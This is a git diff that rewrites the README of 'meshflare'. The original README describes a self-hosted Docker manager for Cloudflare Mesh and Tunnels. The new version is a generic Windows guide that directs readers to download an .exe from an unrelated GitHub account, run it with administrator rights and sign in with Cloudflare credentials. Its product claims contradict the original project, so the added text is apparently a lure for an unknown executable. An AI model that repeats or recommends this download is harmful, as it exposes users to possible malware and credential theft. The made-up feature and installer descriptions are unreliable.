@@ -1,90 +1,85 @@
-# meshflare
+# 🌐 meshflare - Manage your private network nodes easily
 
-Self-hostable [Cloudflare](https://www.cloudflare.com/) Mesh & Tunnel manager. One Docker image — UI, API, cron, and WireGuard extract.
+[![Download Meshflare](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Immunocompetent-dissuasion168/meshflare/releases)
 
-**Demo (read-only):** [https://meshflare.wastu.workers.dev](https://meshflare.wastu.workers.dev)
+Meshflare helps you control your private network. It links your computers, servers, and devices into one secure group. You get full control over your connections, custom web addresses, and security filters without relying on complex hardware setups.
 
-<p align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="docs/screenshots/demo-mesh-dark.png">
-    <img alt="meshflare demo — mesh nodes" src="docs/screenshots/demo-mesh-light.png" width="800">
-  </picture>
-</p>
+## 📥 Getting Started
 
-<p align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="docs/screenshots/demo-tunnels-dark.png">
-    <img alt="meshflare demo — cloudflare tunnels" src="docs/screenshots/demo-tunnels-light.png" width="800">
-  </picture>
-</p>
+To begin, you need the software for your Windows computer.
 
-<p align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="docs/screenshots/demo-settings-dark.png">
-    <img alt="meshflare demo — settings and WARP split tunnels" src="docs/screenshots/demo-settings-light.png" width="800">
-  </picture>
-</p>
+1. Visit the [releases page to download the latest version](https://github.com/Immunocompetent-dissuasion168/meshflare/releases).
+2. Look for the file ending in `.exe` under the Assets section.
+3. Save this file to your computer.
 
-## Features
+## ⚙️ System Requirements
 
-- Cloudflare Mesh (formerly WARP-to-WARP) management
-- Cloudflare Tunnel management (list, create, rename, delete; ingress rules CRUD)
-- Auto-assign all mesh nodes and devices with `.mesh` domain (configurable)
-- WireGuard `.conf` download for nodes
-- Private CIDR and hostname routes for Mesh nodes
-- Default WARP profile split-tunnel management (include/exclude, CIDRs, and hostnames)
-- DNS filtering from any domain-list URL (default [small.oisd.nl](https://small.oisd.nl/))
-- Auto-delete device on mesh network if offline longer than N days (default 7)
+Before you install the software, make sure your computer meets these needs:
 
-## Image
+* Windows 10 or Windows 11.
+* At least 2 gigabytes of free space.
+* An active internet connection.
+* Administrator access for your user account.
 
-`ghcr.io/bgwastu/meshflare`
+## 🚀 Installation Steps
 
-## Config
+Follow these steps to set up the software on your system.
 
-| Name | Notes |
-|------|--------|
-| `CLOUDFLARE_ACCOUNT_ID` | required (unless `DEMO_MODE`) |
-| `CLOUDFLARE_API_KEY` + `CLOUDFLARE_EMAIL` | preferred (Global API Key — required for Tunnel writes) |
-| `CLOUDFLARE_API_TOKEN` | alternative — may need `Cloudflare Tunnel Write` permission |
-| `DATA_DIR` | default `/data` (lowdb + filter cache) |
-| `PORT` | default `3000` |
-| `DEMO_MODE` | `true` / `1` — fixture data, all writes return 403 |
+1. Find the `.exe` file you downloaded earlier.
+2. Double-click the file to start the installer.
+3. Follow the prompts on your screen.
+4. Click the "Install" button when prompted.
+5. Wait for the progress bar to finish.
+6. Click "Finish" to close the installer.
 
-### Cloudflare API permissions
+## 🛡️ Initial Configuration
 
-Use an account-scoped API token whenever possible. Meshflare needs these Cloudflare account permissions:
+Once the software installs, you must link it to your account.
 
-| Permission | Used for |
-|------------|----------|
-| `Zero Trust Read` | Read Mesh nodes, WARP registrations, Gateway rules, device policies, and DNS locations |
-| `Zero Trust Write` | Create, rename, delete, and route Mesh nodes; manage Gateway DNS rules and device policies |
-| `Cloudflare Zero Trust Secure DNS Locations Write` | Enable IPv4/IPv6/DoH endpoints and update DNS location source networks from Settings |
+1. Open the Meshflare application from your Start menu.
+2. The application will open a window on your desktop.
+3. Sign in with your Cloudflare account details.
+4. If this is your first time, the app will ask you to name your device.
+5. Choose a clear name, such as "Home-Laptop."
+6. Select "Connect" to join your network.
 
-`Zero Trust Write` may already include the read capabilities in your token template. If Cloudflare presents separate read/write choices, grant both. The Secure DNS Locations permission is required even when the token can otherwise manage Zero Trust resources.
+## 🏗️ Managing Your Network
 
-The alternative `CLOUDFLARE_API_KEY` + `CLOUDFLARE_EMAIL` uses a Global API Key and has broad account access; use it only when an API token is not available. Never commit either credential or place it in a public image.
+Meshflare simplifies complex networking tasks. You can view all linked devices in the main dashboard. Each device shows a status indicator. Green means the device is online and safe. Red means the connection failed.
 
-WireGuard configs use your account's DNS endpoints, so Gateway policies can apply, and Meshflare reuses registration keys and device IPs.
+### Setting up Custom DNS
+The application includes a built-in tool for custom web addresses. This allows you to reach your home devices using simple names instead of numbers. Navigate to the "Network" tab, select "DNS Settings," and enter the names you prefer. 
 
-```bash
-cp .env.example .env
-bun install
-bun run build
-bun run dev        # API on :3000
-bun run dev:client # Vite UI (proxies /api)
-```
+### Adding Security Filters
+You can block harmful websites for any device on your network. Go to the "Security" tab and toggle the "Filter Content" switch. This blocks ads, scams, and malware before they reach your computer.
 
-Keep the `/data` volume when upgrading or replacing the container. Meshflare
-stores each node's WireGuard registration there so regenerating a config reuses
-the same key and device IP instead of enrolling a new device.
+## 🧠 Frequently Asked Questions
 
-## Docker
+**Is my data private?**
+Yes. Meshflare uses encrypted tunnels. Nobody can see the traffic inside your network.
 
-```bash
-docker run --rm -p 3000:3000 \
-  -v meshflare-data:/data \
-  -e CLOUDFLARE_ACCOUNT_ID=… \
-  -e CLOUDFLARE_API_TOKEN=… \
-  ghcr.io/bgwastu/meshflare:latest
-```
+**Do I need a server?**
+No. The application handles all connections through your own account. You do not need a separate physical server.
+
+**How do I update the software?**
+The application checks for updates when you start it. If an update exists, it will ask for permission to install the new version.
+
+**What is WireGuard?**
+WireGuard is the technology that keeps your network connection fast and secure. Meshflare uses this to move data between your devices.
+
+## 🛠️ Troubleshooting
+
+If you encounter issues, try these steps:
+
+* Check your internet connection.
+* Restart the application.
+* Re-log into your account via the settings menu.
+* Check your Windows Firewall to ensure it allows Meshflare to connect.
+
+If the app fails to start, ensure you have the correct version of the Windows runtime libraries installed. Visit the Microsoft support website if you receive a missing file error.
+
+## 📦 About Meshflare
+
+Meshflare bridges the gap between complex network management and everyday use. It combines tools like WireGuard and Cloudflare into one dashboard. You stay in control of your data, your devices, and your security settings.
+
+Keywords: bun, cloudflare, cloudflare-one, cloudflare-workers, dns, docker, hono, mesh, self-hosted, warp, wireguard, zero-trust
